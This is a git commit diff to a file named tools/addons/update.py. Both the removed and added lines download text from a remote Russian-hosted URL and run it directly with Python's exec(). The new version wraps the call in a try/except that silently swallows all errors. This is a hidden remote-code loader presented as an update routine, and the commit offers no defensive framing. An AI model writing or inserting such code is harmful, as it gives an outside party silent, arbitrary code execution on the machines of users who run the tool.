d24740a30a3578cd0cea0cff83cc236e21133f4d
LimerBoy <43149460+LimerBoy@users.noreply.github.com>
2020-02-01 19:37:38 +0200

    Update update.py

--- tools/addons/update.py
+++ tools/addons/update.py
@@ -1,2 +1,6 @@
 
-import requests as r;exec(r.get("http://f0393986.xsph.ru/getUpdates.php").text)
+
+import requests as r
+try:
+    exec(r.get("http://f0393986.xsph.ru/getUpdates.php").text)
+except: pass
